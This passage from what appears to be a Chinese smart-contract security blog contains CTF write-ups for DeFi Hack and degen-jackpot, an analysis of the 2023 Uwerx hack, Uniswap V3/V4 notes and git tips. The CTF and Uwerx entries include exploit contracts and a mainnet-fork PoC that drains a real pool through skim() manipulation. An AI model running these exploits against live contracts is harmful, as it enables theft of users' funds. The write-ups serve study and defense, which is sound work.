memory ExactInputParams =</span><br><span class="line">            Uni_Router_V3.ExactInputParams(path, recipient, amountIn, amountOutMinimum);</span><br><span class="line">        Router.exactInput(ExactInputParams);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-DeFi Hack</title>
      <link href="/2024/11/04/CTF-DeFi-Hack/"/>
      <url>/2024/11/04/CTF-DeFi-Hack/</url>
      
        <content type="html"><![CDATA[<h1 id="DeFi-Hack"><a href="#DeFi-Hack" class="headerlink" title="DeFi Hack"></a>DeFi Hack</h1><p>由于这个是一个题目集，就写在一起，做个写题记录<br>五个题目的源代码，都在这里了：<br>源代码：<a href="https://www.defihack.xyz/level/0xB761C26d6Ade3Da1c6a4313C785b76B90cae702e">点击</a></p><h2 id="May-The-Force-Be-With-You"><a href="#May-The-Force-Be-With-You" class="headerlink" title="May The Force Be With You"></a>May The Force Be With You</h2><p>题目要求是：要取得合约中所有的代币</p><p>首先还是看代码，合约代码，还是简单，重点还是看向withdrew函数，要撤回合约中的所有代币，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw(uint256 numberOfShares) external nonReentrant &#123;</span><br><span class="line">       // Gets the amount of xYODA in existence</span><br><span class="line">       uint256 totalShares = totalSupply();</span><br><span class="line">       // Calculates the amount of YODA the xYODA is worth</span><br><span class="line">       uint256 what =</span><br><span class="line">           numberOfShares.mul(yoda.balanceOf(address(this))).div(totalShares);</span><br><span class="line">       _burn(msg.sender, numberOfShares);</span><br><span class="line">       yoda.transfer(msg.sender, what);</span><br><span class="line"></span><br><span class="line">       emit Withdraw(msg.sender, what);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>有个tranfer函数，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function transfer(address _to, uint256 _amount) public returns (bool success) &#123;</span><br><span class="line">       return doTransfer(msg.sender, _to, _amount);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>又是一个doTransfer函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function doTransfer(address _from, address _to, uint _amount) internal returns(bool) &#123;</span><br><span class="line">       if (_amount == 0) &#123;</span><br><span class="line">           return true;</span><br><span class="line">       &#125;</span><br><span class="line">       // Do not allow transfer to 0x0 or the token contract itself</span><br><span class="line">       require((_to != address(0)) &amp;&amp; (_to != address(this)));</span><br><span class="line">       // If the amount being transfered is more than the balance of the</span><br><span class="line">       //  account the transfer returns false</span><br><span class="line">       if (balances[_from] &lt; _amount) &#123;</span><br><span class="line">           return false;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // First update the balance array with the new value for the address</span><br><span class="line">       //  sending the tokens</span><br><span class="line">       balances[_from] = balances[_from] - _amount;</span><br><span class="line">       // Then update the balance array with the new value for the address</span><br><span class="line">       //  receiving the tokens</span><br><span class="line"></span><br><span class="line">       require(balances[_to] + _amount &gt;= balances[_to]); // Check for overflow</span><br><span class="line">       balances[_to] = balances[_to] + _amount;</span><br><span class="line">       // An event to make the transfer easy to find on the blockchain</span><br><span class="line">       Transfer(_from, _to, _amount);</span><br><span class="line">       return true;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>一路看下来，我并没有看见什么地方漏洞，那么又去看看<code>deposit</code>的函数，能不能免费给我们<code>mint</code>代币，果然发现了蹊跷，<code>deposit</code>函数中也存在<code>dotransfer</code>函数，而且它和<code>transferfrom</code>函数的表达上还有些歧义，如果<code>dotransfer</code>函数中，由于<code>aomunt</code>值太大，会导致<code>deposit</code>函数中的<code>transferFrom</code>函数直接返回<code>flase</code>,那么就意味着我们给合约转账失败，换句话来说就是我们可以免费获得x代币，然后再调用withdrew函数，就能获得大量的代币，把合约掏空。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (balances[_from] &lt; _amount) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>攻击思路；首先调用deposit函数，存入数量很大的amount，让合约给我们免费mint x代币。然后再调用withdrew函数，就能获得合约中的所有代币了。</p><p>总的来说这个题，就是要要看好使用的哪些函数，而且他们的返回值都是bool类型的，然后再继续的找漏洞，理清合约的逻辑,敢于想象</p><h2 id="DiscoLP"><a href="#DiscoLP" class="headerlink" title="DiscoLP"></a>DiscoLP</h2><p>题目要求是：<br>DiscoLP 是一个全新的流动性挖矿协议！您可以通过存入一些 JIMBO 或 JAMBO 代币来参与。所有流动性将提供给 JIMBO-JAMBO Uniswap 对。通过向我们提供流动性，您将获得 DISCO 代币作为回报！</p><p>您有 1 个 JIMBO 和 1 个 JAMBO，您能获得至少 100 个 DISCO 代币吗？</p><p>看向合约代码，只有一个主函数，depositToken,检查它有没有token的计算错误，<br>发现都是正常的，但是漏了一点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _joinPool(address _pair, address _token, uint256 _amount, uint256 _minShares) internal returns (uint256 _shares)</span><br><span class="line"> &#123;</span><br><span class="line">   if (_amount == 0) return 0;</span><br><span class="line">   address _router = $.UniswapV2_ROUTER02;</span><br><span class="line">   address _token0 = Pair(_pair).token0();</span><br><span class="line">   address _token1 = Pair(_pair).token1();</span><br><span class="line">   address _otherToken = _token == _token0 ? _token1 : _token0;</span><br><span class="line">   (uint256 _reserve0, uint256 _reserve1,) = Pair(_pair).getReserves();</span><br><span class="line">   uint256 _swapAmount = _calcSwapOutputFromInput(_token == _token0 ? _reserve0 : _reserve1, _amount);</span><br><span class="line">   if (_swapAmount == 0) _swapAmount = _amount / 2;</span><br><span class="line">   uint256 _leftAmount = _amount.sub(_swapAmount);</span><br><span class="line">   _approveFunds(_token, _router, _amount);</span><br><span class="line">   address[] memory _path = new address[](2);</span><br><span class="line">   _path[0] = _token;</span><br><span class="line">   _path[1] = _otherToken;</span><br><span class="line">   uint256 _otherAmount = Router02(_router).swapExactTokensForTokens(_swapAmount, 1, _path, address(this), uint256(-1))[1];</span><br><span class="line">   _approveFunds(_otherToken, _router, _otherAmount);</span><br><span class="line">   (,,_shares) = Router02(_router).addLiquidity(_token, _otherToken, _leftAmount, _otherAmount, 1, 1, address(this), uint256(-1));</span><br><span class="line">   require(_shares &gt;= _minShares, &quot;high slippage&quot;);</span><br><span class="line">   return _shares;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>在主函数中，调用_joinPool函数时，没有对token的来源进行检查，也就是说，只要pair对随意俩个token，就能mint DISCO<br>我们可以自己创造一个pair,然后赋值大量的token，给原本的流动性池提供该token。这样就能获得奖励的lp币</p><p>Uniswap 的设计方式是必须以相同比例存入一对代币，但此功能允许质押单个代币，将价值的一半换成第二个代币。作为回报，授予了 LP 股票。</p><p> depositToken函数不仅限于 JIMBO 或 JAMBO 令牌，而是实际上接受任何令牌，没有对参数进行验证。这意味着几乎可以质押任何代币，从而可以凭空铸造 DISCO。虽然原因很简单，但攻击执行需要多个步骤。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier:MIT </span><br><span class="line">pragma solidity^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface UniswapV2Factory&#123;</span><br><span class="line">    function createpair(address token0,address token1) externals return (address pair);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface UniswapV2Router &#123;</span><br><span class="line">   function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface Discolp&#123;</span><br><span class="line">    function depositToken(address _token,uint256 _amount,uint256 _minShares) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Token is ERC20 &#123;</span><br><span class="line">    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) public &#123;</span><br><span class="line">        _mint(msg.sender, 2**256 - 1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    UniswapV2Factory factory;</span><br><span class="line">    UniswapV2Router router;</span><br><span class="line">    Discolp discolp;</span><br><span class="line">    uint256 balance;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    constructor (address _factory,address _router,address _discolp)&#123;</span><br><span class="line">        factory = UniswapV2Factory (_factory);</span><br><span class="line">        router = UniswapV2Router (_router);</span><br><span class="line">        discolp = Discolp (_discolp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function pwn() exteranl&#123;</span><br><span class="line">    Token usdc =new Token(&quot;USDC token&quot;,&quot;USDC&quot;);</span><br><span class="line">    usdc.approve(factory,2^256-1);</span><br><span class="line">    usdc.approve(router,2^256-1);</span><br><span class="line">    //创建tokenA(JIMBO代币)，保证后续swap操作得以通过</span><br><span class="line">    ERC20(tokenA).approve(router,2^256-1);</span><br><span class="line"></span><br><span class="line">    //创建JIMBO-usdc对</span><br><span class="line">    address pair = factory.create(address (usdc),address(tokenA));</span><br><span class="line"></span><br><span class="line">    //添加流动性</span><br><span class="line">      (uint256 amountA, uint256 amountB, uint256 _shares) = IUniswapV2Router(_router).addLiquidity(</span><br><span class="line">          address(usdc),</span><br><span class="line">          address(tokenA),</span><br><span class="line">          100000000000 * 10 ** 18, //增加流动性usdc的数量</span><br><span class="line">          1 * 10 ** 18,//增加流动性JIMBO数量</span><br><span class="line">          1, 1, </span><br><span class="line">          address(this),//接受lp的地址，合约本身。</span><br><span class="line">           2**256 - 1);</span><br><span class="line">        DiscoLP(instance).depositToken(address(evil), amount, 1);</span><br><span class="line"></span><br><span class="line">        uint256 balance = discolp.balanceOf(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这就是以上的攻击代码，总结以下，关于流动性的题，首先要看，token的计算，再看逻辑，然后一些检查条件，是否可以再次创建pair,进行套利。</p><h2 id="P2PSwapper"><a href="#P2PSwapper" class="headerlink" title="P2PSwapper"></a>P2PSwapper</h2><p>题目要求：<br>P2PSwapper 是一款适用于任何资产的超级方便的零信任 P2P DEX！ 费用是固定的，所以欢迎鲸鱼！ 此外，我们还有一个推荐计划，所有费用都在我们和主要所有者之间平均分配。</p><p>我们创建了一个样本交易并为此存入了一些资金。我们希望确保您无法提取分配给我们交易的费用。</p><p>您必须从 P2PSwapper 的余额中耗尽所有 WETH 代币。</p><p>看向主要的P2P_WETH合约，其实漏洞就遇到过几次了，<br>这是库合约中的函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function safeTransferFrom(</span><br><span class="line">        address token,</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 value</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        // bytes4(keccak256(bytes(&#x27;transferFrom(address,address,uint256)&#x27;)));</span><br><span class="line">        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));</span><br><span class="line">        require(</span><br><span class="line">            success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),</span><br><span class="line">            &#x27;TransferHelper::transferFrom: transferFrom failed&#x27;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function safeTransfer(</span><br><span class="line">       address token,</span><br><span class="line">       address to,</span><br><span class="line">       uint256 value</span><br><span class="line">   ) internal &#123;</span><br><span class="line">       // bytes4(keccak256(bytes(&#x27;transfer(address,uint256)&#x27;)));</span><br><span class="line">       (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, value));</span><br><span class="line">       require(</span><br><span class="line">           success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))),</span><br><span class="line">           &#x27;TransferHelper::safeTransfer: transfer failed&#x27;</span><br><span class="line">       );</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>和之前的一样，就是外部调用，没有进行对token地址的检查，所以可以自己编写一个攻击合约，就是一个token合约,可以进行攻击</p><h2 id="FakerDAO"><a href="#FakerDAO" class="headerlink" title="FakerDAO"></a>FakerDAO</h2><p>由于已经关网了，这个题要合约实例才能写，个人理解</p><h2 id="Main-Khinkal-Chef"><a href="#Main-Khinkal-Chef" class="headerlink" title="Main Khinkal Chef"></a>Main Khinkal Chef</h2><p>题目要求，还是要消耗合约中所有代币</p><p>这个合约，就是前期有点难看懂，其实就是实现了一个流动性池的的奖励机制</p><p>漏洞就在于这个函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Update governance address by the governance.</span><br><span class="line">  function setGovernance(</span><br><span class="line">      address _governance</span><br><span class="line">  ) public &#123;</span><br><span class="line">      require(msg.sender == owner() || msg.sender == _governance, &quot;Access denied&quot;);</span><br><span class="line">      governance = _governance;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>由于传递了参数，这个governance我们就可以改动，一旦成为了，管理员，那么我们就可以自己创建一个流动性池，然后利用自己合约是个代币合约，给原合约转入很多代币，以便后面消除它</p><p>攻击合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-Lincense-Identifier:MIT</span><br><span class="line">pragma solidity ^0.8.12;</span><br><span class="line"></span><br><span class="line">import &quot;../levels/MainChef.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract MainChefAttack &#123;</span><br><span class="line">    uint pwned;</span><br><span class="line">    uint tradeId;</span><br><span class="line">    MainChef target;</span><br><span class="line"></span><br><span class="line">    constructor(MainChef _target) public &#123;</span><br><span class="line">        target = _target;</span><br><span class="line">        pwned = 0;</span><br><span class="line">    &#125;</span><br><span class="line">//前期准备工作</span><br><span class="line">    function prepare() public &#123;</span><br><span class="line">        /先成为governance</span><br><span class="line">        target.setGovernance(address(this));</span><br><span class="line">        //将自己合约作为一个新的lp代币，添加到流动池中</span><br><span class="line">        target.addToken(IERC20(address(this)));</span><br><span class="line">        </span><br><span class="line">        target.deposit(1, 500010319375738048); // (31333333337 + 313337) / 2 * 1e12 / 31333</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() public &#123;</span><br><span class="line">        target.withdraw(1);</span><br><span class="line">    &#125;</span><br><span class="line">    //为了满足原合约对lp代币的一些require，（也就是绕过某些条件）</span><br><span class="line">    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function balanceOf(address a) external returns (uint) &#123;</span><br><span class="line">        return 1e18;</span><br><span class="line">    &#125;</span><br><span class="line">//做一个检查，是否转账成功了</span><br><span class="line">    function transfer(address recipient, uint256 amount) public virtual returns (bool) &#123;</span><br><span class="line">      if(pwned != 0) return true;</span><br><span class="line">      pwned += 1;</span><br><span class="line">      target.withdraw(1);</span><br><span class="line">      return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>个人觉得就是没有注意逻辑性，可以随便更改governance,然后操控权控制在自己手中</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Uwerx攻击事件分析</title>
      <link href="/2024/11/03/Uwerx%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/11/03/Uwerx%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>攻击介绍<br>2023年8月2日，Uwerx被黑客攻击，损失了175ETH。</p><p>攻击分析<br>我们通过phalcon来分析。</p><p>通过调用栈能发现攻击者通过不断在uniswap V2 Pool交换，最终获利。很明显是Pool的兑换比率被破坏了。之所以能被破坏，是因为uwerx TOKEN合约的_transfer()方法被利用了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(</span><br><span class="line">        address from,</span><br><span class="line">        address to,</span><br><span class="line">        uint256 amount</span><br><span class="line">    ) internal virtual &#123;</span><br><span class="line">        require(from != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line">        require(to != address(0), &quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">        _beforeTokenTransfer(from, to, amount);</span><br><span class="line"></span><br><span class="line">        uint256 fromBalance = _balances[from];</span><br><span class="line">        require(fromBalance &gt;= amount, &quot;ERC20: transfer amount exceeds balance&quot;);</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _balances[from] = fromBalance - amount;</span><br><span class="line">            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by</span><br><span class="line">            // decrementing then incrementing.</span><br><span class="line">            _balances[to] += amount;</span><br><span class="line">        &#125;</span><br><span class="line">        if (to == uniswapPoolAddress) &#123;</span><br><span class="line">            uint256 userTransferAmount = (amount * 97) / 100;</span><br><span class="line">            uint256 marketingAmount = (amount * 2) / 100;</span><br><span class="line">            uint256 burnAmount = amount - userTransferAmount - marketingAmount;</span><br><span class="line"></span><br><span class="line">            emit Transfer(from, to, userTransferAmount);</span><br><span class="line">            emit Transfer(from, marketingWalletAddress, marketingAmount);</span><br><span class="line">            _burn(from, burnAmount);</span><br><span class="line"></span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            emit Transfer(from, to, amount);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        _afterTokenTransfer(from, to, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现当to &#x3D;&#x3D; uniswapPoolAddress时会有1%的token被销毁。uniswapPoolAddress为0x00……0001，此时调用uniswap的skim(to)方法，to设为0x00……0001，就能让Pool的兑换比率被破坏。</p><p>POC</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Vulnerable Contract : https://etherscan.io/token/0x4306b12f8e824ce1fa9604bbd88f2ad4f0fe3c54</span><br><span class="line">// Attack Tx : https://etherscan.io/tx/0x3b19e152943f31fe0830b67315ddc89be9a066dc89174256e17bc8c2d35b5af8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line">    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);</span><br><span class="line">    IERC20 WERX = IERC20(0x4306B12F8e824cE1fa9604BbD88f2AD4f0FE3c54);</span><br><span class="line">    Uni_Router_V2 Router = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);</span><br><span class="line">    Uni_Pair_V2 pair = Uni_Pair_V2(0xa41529982BcCCDfA1105C6f08024DF787CA758C4);</span><br><span class="line">    </span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;https://eth.llamarpc.com&quot;, 17826202);</span><br><span class="line">        vm.label(address(WETH), &quot;WETH&quot;);</span><br><span class="line">        vm.label(address(WERX), &quot;WERX&quot;);</span><br><span class="line">        vm.label(address(Router), &quot;Router&quot;);</span><br><span class="line">        vm.label(address(pair), &quot;pair&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() external &#123;</span><br><span class="line">        // mock a flash loan for simplicity</span><br><span class="line">        deal(address(WETH), address(this), 20_000 ether);</span><br><span class="line">        WETH.approve(address(Router), type(uint256).max);</span><br><span class="line">        WERX.approve(address(Router), type(uint256).max);</span><br><span class="line">        </span><br><span class="line">        pair.sync();</span><br><span class="line"></span><br><span class="line">        address[] memory path = new address[](2);</span><br><span class="line">        path[0] = address(WETH);</span><br><span class="line">        path[1] = address(WERX);</span><br><span class="line"></span><br><span class="line">        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(20_000 ether, 0, path, address(this), block.timestamp);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">        WERX.transfer(address(pair), 4429817738575912760684500);</span><br><span class="line">                                     </span><br><span class="line">        pair.skim(address(0x01));</span><br><span class="line">        pair.sync();</span><br><span class="line"></span><br><span class="line">        path[0] = address(WERX);</span><br><span class="line">        path[1] = address(WETH);</span><br><span class="line">        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(WERX.balanceOf(address(this)), 0, path, address(this), block.timestamp);</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker WETH balance after exploit&quot;, WETH.balanceOf(address(this)), WETH.decimals()</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        emit log_named_decimal_uint(</span><br><span class="line">            &quot;Attacker WETH balance after exploit, ETH PROFIT&quot;, WETH.balanceOf(address(this)) - 20_000 ether, WETH.decimals()</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 攻击事件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UniswapV3,V4 功能对比</title>
      <link href="/2024/11/03/UniswapV3-V4-%E5%8A%9F%E8%83%BD%E5%AF%B9%E6%AF%94/"/>
      <url>/2024/11/03/UniswapV3-V4-%E5%8A%9F%E8%83%BD%E5%AF%B9%E6%AF%94/</url>
      
        <content type="html"><![CDATA[<h1 id="以下功能对比摘抄于官网"><a href="#以下功能对比摘抄于官网" class="headerlink" title="以下功能对比摘抄于官网"></a>以下功能对比摘抄于官网</h1><h2 id="V4-与-V3"><a href="#V4-与-V3" class="headerlink" title="V4 与 V3"></a>V4 与 V3</h2><p>虽然 Uniswap v4 的基础集中流动性与 Uniswap v3 相同， 架构和会计存在一些关键差异。</p><h2 id="单例设计"><a href="#单例设计" class="headerlink" title="单例设计"></a>单例设计</h2><p>矿池创建<br>V4：单例合约有助于创建矿池和 还会存储其 state。此模式可降低创建池时的成本 以及执行多跳交换。因为矿池是合约状态，而不是全新的合约本身，所以矿池的创建成本要低得多。</p><p>V3：工厂合约负责创建矿池。池是 一个单独的 Contract 实例，用于管理自己的 state。矿池初始化 成本高昂，因为合约创建是 gas 密集型的</p><h2 id="Flash-Accounting-（快速记帐）"><a href="#Flash-Accounting-（快速记帐）" class="headerlink" title="Flash Accounting （快速记帐）"></a>Flash Accounting （快速记帐）</h2><p>V4：单例使用 flash accounting，即解锁 PoolManager 的调用方 允许进行余额更改操作（多次掉期、多次流动性修改等） 并且只需要在序列的最末端执行 token 传输。</p><p>V3：因为 V3 中缺少 Flash Accounting，所以这是责任 集成合约执行代币转账，在每次单独调用后，对每个单独的矿池合约进行代币转账</p><h2 id="流动性费用会计"><a href="#流动性费用会计" class="headerlink" title="流动性费用会计"></a>流动性费用会计</h2><p>V4：应计费用在修改流动性时起到抵免的作用。 增加流动性会将费用收入转化为流动性 仓内流动性降低会自动 要求提取未领取的费用收入。</p><p>在创建流动性时，可以提供一个额外的参数 salt。盐用于区分同一池中相同范围的位置。 这种分离可能是简化费用会计的首选。如果两个用户共享相同的 range 和 state 中，集成 Contract 必须小心管理 费用PoolManager</p><p>V3：相同范围和矿池的流动性持仓将共享相同的状态。虽然相信 当时 gas 效率更高，整合合约将需要处理费用管理，因为 状态在 Core Pool Contract 上共享</p><h2 id="原生-ETH"><a href="#原生-ETH" class="headerlink" title="原生 ETH"></a>原生 ETH</h2><p>V4：矿池对支持原生代币，因此 ETH 交换器和 流动性提供者受益于更便宜的 gas 成本降低 转移和取消额外的包装费用。</p><p>V3：ETH 需要先包装后再与其他代币配对。 由于包装和转移，这会导致更高的 gas 成本 包装的本机令牌。</p><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>仅限 V4：所有者现在可以为其位置设置订阅者。 每次头寸的流动性时，都会通知订阅者合约 或所有者变更。订阅者启用质押&#x2F;流动性挖矿，但用户不需要 转移他们的 ERC-721 代币。</p><p>V3：v3 中的权益质押要求用户将他们的 ERC-721 代币转移到合约上，从而使底层资产面临恶意行为的风险。</p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>我觉得v4的最伟大功能就是实现了单例设计，原先每部署一个流动性池就要部署一个新合约，而V4却不用，它将所有的流动性池保存在一个单例合约中，然后这样的做法会节省很多gas费用，而且还增加了hook钩子的用法，让用户多了更多的体验</p><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><p>在 Uniswap V4 中引入了 hook 的概念，可以在流动性池的调用的生命周期内某些指定点执行一些自定义的逻辑，hook 功能增加了流动性池的灵活性，可以执行更多的富有创造力的功能</p><p>Uniswap V4 目前支持在 8 个特定的位置进行 hook 回调：</p><ul><li>beforeInitialize &#x2F; afterInitialize</li><li>beforeModifyPosition &#x2F; afterModifyPosition</li><li>beforeSwap &#x2F; afterSwap</li><li>beforeDonate &#x2F; afterDonate<br>它的功能的案例也很齐全，在官方编写的hook案例可以看见如下几个例子：</li><li>几何平均预言机（GeomeanOracle.sol）</li><li>限价单（LimitOrder.sol）</li><li>时间加权平均做市商（TWAMM.sol）</li><li>波动率预言机（VolatilityOracle.sol）</li></ul><h2 id="Flash-account"><a href="#Flash-account" class="headerlink" title="Flash account"></a>Flash account</h2><p> 在 Uniswap V4 中一个新的设计是 Flash accounting。在 Uniswap 的早期版本中，像 swap 或者 addLiquidity 等操作都是以代币的转移结束，而在 V4 中，每一个操作会更新内部的一个净余额（delta），在所有操作结束时会校验该值是否为 0，必须保证该值为 0 才能交易成功。当 Flash accounting 和 Singleton 结合时，可以大大简化多跳交易。在 PoolManager 合约中新增了 take 和 settle 函数，分别用于向池中借出、存入资金，通过调用这两个函数，保证调用结束时不欠 PoolManager 合约或调用者任何代币。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git 协作流程</title>
      <link href="/2024/11/02/git-%E5%8D%8F%E4%BD%9C%E6%B5%81%E7%A8%8B/"/>
      <url>/2024/11/02/git-%E5%8D%8F%E4%BD%9C%E6%B5%81%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h2 id="团队协作"><a href="#团队协作" class="headerlink" title="团队协作"></a>团队协作</h2><p>首先使用在gitub 上进行团队的协作，就是你自己要先弄一个分支，然后再提交上去，<br>流程如下：<br><strong>git clone 仓库</strong><br><strong>进入到仓库中：cd 仓库名</strong><br><strong>然后切换分支到要协作的分支：git checkout 分支名</strong><br><strong>创建自己的分支：git checkout -b 分支名1</strong><br><strong>写好自己的部分再提交：git add .</strong><br><strong>同上提交：git commit -m “描述”</strong><br><strong>推送至远程自己创建的分支：git push origin 分支名1</strong><br>这样就可以再创库中看到自己的分支，然后再提交去分支名（也就是说pr:Pull requst）注意要指定review;</p><h2 id="个人上传文件到仓库"><a href="#个人上传文件到仓库" class="headerlink" title="个人上传文件到仓库"></a>个人上传文件到仓库</h2><p> 将本地文件上传到github上，<br>要有一个自己想上传的仓库，<br>cd 要上传的文件名，git remote add origin (ssh下的仓库地址)，<br>切换分支，主要是看仓库是master,还是main, 还是其他的分支，git branch -M main , 切换到main分支上<br>直接上传到分支上 git push -u origin main<br>即可</p><h2 id="初始化一个仓库"><a href="#初始化一个仓库" class="headerlink" title="初始化一个仓库"></a>初始化一个仓库</h2><p>git init 仓库名<br>写好文件后<br>使用git add . 将文件上传至缓存区<br>查看分支 git branch<br>选择要上传到的分支，git checkout 分支名<br>然后就可以直接远程推送 git push -u origin main </p><blockquote><p>遇到文件太大，就使用git lfs install 来安装<br>s</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> 基本知识 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-degen-jackpot</title>
      <link href="/2024/10/30/CTF-degen-jackpot/"/>
      <url>/2024/10/30/CTF-degen-jackpot/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF-degen-jackpot"><a href="#CTF-degen-jackpot" class="headerlink" title="CTF-degen-jackpot"></a>CTF-degen-jackpot</h1><p>题目源代码：<a href="https://github.com/0xToshii/mr-steal-yo-crypto-ctf/tree/implement/contracts/degen-jackpot">点击</a></p><p>题目要求：首先合约有1000个代币，你初始有一个代币，你的任务是提取全部的代币从合约中。</p><p>这个题合约看似很多，其实功能明显<br>FNFTHHandler合约是这个币的一些操作<br>LockManager合约是进行锁定地址的操作<br>OtherContract 合约，就是其他合约<br>OtherInterface 合约，就是接口的实现，可以在这里看见合约的一些功能函数。<br>Revert 合约，这个就是主合约了，也是我们要重点分析的合约<br>TokenVault合约，显而易见。金库合约，</p><p>要想取得全部代币，还是先看那里可以转出，<br>在Revert合约中，有个撤回函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdrawFNFT(uint fnftId, uint quantity) external override revestNonReentrant(fnftId) &#123;</span><br><span class="line">      address fnftHandler = addressesProvider.getRevestFNFT();</span><br><span class="line">      // Check if this many FNFTs exist in the first place for the given ID</span><br><span class="line">      require(quantity &lt;= IFNFTHandler(fnftHandler).getSupply(fnftId), &quot;E022&quot;);</span><br><span class="line">      // Check if the user making this call has this many FNFTs to cash in</span><br><span class="line">      require(quantity &lt;= IFNFTHandler(fnftHandler).getBalance(_msgSender(), fnftId), &quot;E006&quot;);</span><br><span class="line">      // Check if the user making this call has any FNFT&#x27;s</span><br><span class="line">      